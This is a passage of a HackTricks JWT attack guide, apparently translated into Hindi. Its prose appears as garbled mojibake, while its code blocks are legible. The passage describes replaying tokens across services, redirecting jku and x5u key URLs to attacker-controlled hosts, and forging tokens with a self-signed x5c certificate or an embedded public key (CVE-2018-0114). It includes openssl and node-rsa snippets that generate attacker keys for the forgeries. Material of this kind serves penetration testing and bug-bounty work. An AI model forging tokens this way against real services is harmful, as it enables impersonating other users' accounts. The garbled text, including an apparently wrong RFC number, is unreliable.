рдЧреНрд░рд╛рд╣рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрджрд┐ рдЖрдк рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ JWT рдХрд┐рд╕реА рддреГрддреАрдп-рдкрдХреНрд╖ рд╕реЗрд╡рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рд░реА рдпрд╛ рдирд╡реАрдиреАрдХреГрдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рд▓рд╛рдпрдХ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЙрд╕реА рд╕реЗрд╡рд╛ рдХреЗ рдЕрдиреНрдп рдЧреНрд░рд╛рд╣рдХреЛрдВ рдкрд░ рдЕрдкрдиреЗ рд╕рдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо/рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╣рд╛рдВ, рддреЛ рдЙрд╕ рдЯреЛрдХрди рдХреЛ рд▓реЗрдХрд░ рдЕрдкрдиреЗ рд▓рдХреНрд╖реНрдп рдХреЛ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдкреБрдирдГ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдХреНрдпрд╛ рдпрд╣ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ?

* рдпрджрд┐ рдЖрдкрдХрд╛ рдЯреЛрдХрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддреЗ рдХреЛ рдирдХрд▓реА рдмрдирд╛рдиреЗ рдХреА рдПрдХ рдЧрдВрднреАрд░ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рддреГрддреАрдп-рдкрдХреНрд╖ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рд╡реНрдпрд╛рдкрдХ рдкрд░реАрдХреНрд╖рдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХрд╛рдиреВрдиреА рдзреБрдВрдзрд▓реЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ!

**рдХреНрдпрд╛ exp рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИ?**

"exp" рдкреЗрд▓реЛрдб рджрд╛рд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЛрдХрди рдХреА рд╕рдорд╛рдкреНрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ JWTs рдЕрдХреНрд╕рд░ рд╕рддреНрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЕрднрд╛рд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рд╕рд╛рд╡рдзрд╛рдиреА рд╕реЗ рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрддреА рд╣реИ - рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХрд┐рд╕реА рдФрд░ рдХреЗ JWT рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рдФрд░ рдкреБрдирдГ рдкреНрд░рдпреЛрдЧ рдХрд░рдирд╛ рдЖрдкрдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдЪреНрдЫрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред\
JWT рдкреБрдирдГ рдкреНрд░рдпреЛрдЧ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рдЙрдкрд╛рдп (рдЬрд┐рд╕реЗ JWT RFC рджреНрд╡рд╛рд░рд╛ рд╕рд▓рд╛рд╣ рджреА рдЧрдИ рд╣реИ) "exp" рджрд╛рд╡реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реИред рдпрд╣ рднреА рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдЬрд╛рдВрдЪреЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛рдПрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдпрд╣ рдореВрд▓реНрдп рд╕рдВрд╕рд╛рдзрд┐рдд рд╣реЛ рдФрд░ рдЯреЛрдХрди рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬрд╣рд╛рдВ рдпрд╣ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИред рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ "exp" рджрд╛рд╡рд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд░реАрдХреНрд╖рдг рд╕рдордп рд╕реАрдорд╛рдПрдВ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ - рдЯреЛрдХрди рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдФрд░ рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдкреБрдирдГ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред _jwt\_tool рдХреЗ -R рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЯреЛрдХрди рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕рдорд╛рдкреНрддрд┐ рдЬрд╛рдВрдЪ рд╢рд╛рдорд┐рд▓ рд╣реИ (рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк UTC рдореЗрдВ)_

* рдпрджрд┐ рдЯреЛрдХрди рдЕрднреА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдорд╛рдиреНрдп рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЯреЛрдХрди рдХрднреА рднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### x5u рдФрд░ jku

#### jku

jku рдХрд╛ рдорддрд▓рдм рд╣реИ **JWK Set URL**ред\
рдпрджрд┐ рдЯреЛрдХрди "jku" **Header** рджрд╛рд╡реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП URL рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**ред рдпрд╣ рдПрдХ URL рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ JWKS рдлрд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ рдЬреЛ рдЯреЛрдХрди рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрдмреНрд▓рд┐рдХ рдХреА рд░рдЦрддреА рд╣реИред рдЯреЛрдХрди рдХреЛ рддреЛрдбрд╝рдХрд░ jku рдорд╛рди рдХреЛ рдЖрдк рдЬрд┐рд╕ рд╡реЗрдм рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЯреНрд░реИрдлрд┐рдХ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрд╕рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдВред

рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рдирдП рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдФрд░ рдкрдмреНрд▓рд┐рдХ рдХреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдмрдирд╛рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рддрдм рдЖрдк [**jwt.io**](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдпрд╛ JWT рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ **рдмрдирд╛рдП рдЧрдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ jku рдХреЛ рдмрдирд╛рдИ рдЧрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реБрдПред** рдПрдХ рдорд╛рдиреНрдп jku рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдореВрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ "e" рдФрд░ "n" рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. рдПрдХ URI рдЬреЛ PEM рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдиреНрдХреЛрдбреЗрдб X.509 (рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рд░реВрдк рдорд╛рдирдХ) рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рдПрдХ рд╕реЗрдЯ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИред рд╕реЗрдЯ рдореЗрдВ рдкрд╣рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡рд╣ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ JWT рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдмрд╛рдж рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рддреНрдпреЗрдХ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдкреВрд░рд╛ рдХрд░рддреЗ рд╣реИрдВред X.509 рдХреЛ RFC 52807 рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЗ рд▓рд┐рдП рдкрд░рд┐рд╡рд╣рди рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕ рд╣реЗрдбрд░ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ URL рдореЗрдВ **рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **JWT рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдЯреЛрдХрди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдиреЗ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
рддрдм рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**jwt.io**](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдпрд╛ JWT рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ **рдмрдирд╛рдП рдЧрдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ x5u рдХреЛ рдмрдирд╛рдИ рдЧрдИ .crt рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реБрдПред**

![](<../.gitbook/assets/image (439).png>)

рдЖрдк рдЗрди рджреЛрдиреЛрдВ рджреЛрд╖реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ **SSRFs рдХреЗ рд▓рд┐рдП** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### x5c

рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ **base64 рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

![](<../.gitbook/assets/image (440).png>)

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ **рдПрдХ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ** рдФрд░ рд╕рдВрдмрдВрдзрд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬрд╛рд▓реА рдЯреЛрдХрди рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ "x5c" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдореВрд▓реНрдп рдХреЛ рдирд╡ рдЙрддреНрдкрдиреНрди рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ, рдЕрд░реНрдерд╛рддреН n, e рдФрд░ x5t рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдореВрд▓ рд░реВрдк рд╕реЗ рдЬрд╛рд▓реА рдЯреЛрдХрди рдХреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### рдПрдореНрдмреЗрдбреЗрдб рдкрдмреНрд▓рд┐рдХ рдХреА (CVE-2018-0114)

рдпрджрд┐ JWT рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рджреГрд╢реНрдп рдХреА рддрд░рд╣ рдПрдХ рдкрдмреНрд▓рд┐рдХ рдХреА рдПрдореНрдмреЗрдбреЗрдб рд╣реИ:

![](<../.gitbook/assets/image (438).png>)

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд nodejs рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдбреЗрдЯрд╛ рд╕реЗ рдПрдХ рдкрдмреНрд▓рд┐рдХ рдХреА рдЬрдирд░реЗрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="тАЛANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"тАЛ;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
рдирдИ рдирд┐рдЬреА/рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЯреЛрдХрди рдХреЗ рдЕрдВрджрд░ рдирдИ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рдЖрдк рдЗрд╕ nodejs рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "n" рдФрд░ "e" рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### JTI (JWT ID)

JTI (JWT ID) рджрд╛рд╡рд╛ рдПрдХ JWT рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЛрдХрди рдХреЛ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдХреА рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ ID рдХреА рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ 4 рд╣реИ (0001-9999)ред рдЕрдиреБрд░реЛрдз 0001 рдФрд░ 10001 рдПрдХ рд╣реА ID рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдмреИрдХрдПрдВрдб рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдкрд░ ID рдмрдврд╝рд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреБрдирдГ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдкреНрд░рддреНрдпреЗрдХ рд╕рдлрд▓ рдкреБрдирдГ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмреАрдЪ 10000 рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### JWT рдкрдВрдЬреАрдХреГрдд рджрд╛рд╡реЗ

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### рдЙрдкрдХрд░рдг

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
